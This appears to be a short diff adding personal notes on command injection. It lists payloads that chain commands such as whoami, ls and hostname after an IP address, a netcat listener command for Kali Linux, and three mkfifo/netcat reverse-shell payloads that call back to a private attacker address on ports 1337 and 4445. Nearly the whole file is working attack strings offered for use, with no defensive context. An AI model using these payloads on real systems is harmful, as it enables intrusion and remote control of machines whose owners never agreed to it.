@@ -1,0 +1,16 @@
+COMMAND INJECTION
+
+192.168.0.67; whoami;
+192.168.0.67; whoami; ls
+192.168.0.67; whoami; hostname; ls ../
+
+Up the server on Kali Linux 
+nc -nlvp 1337
+
+Reverse shell
+
+192.168.0.67; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.66 1337 >/tmp/f
+
+192.168.0.67; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.66 1337 >/tmp/f
+
+192.168.0.67; rm /tmp/f;mkfifo /tmp/f;cat/tmp/f|/bin/sh -i 2>&1|nc 192.168.0.66 4445 >/tmp/f
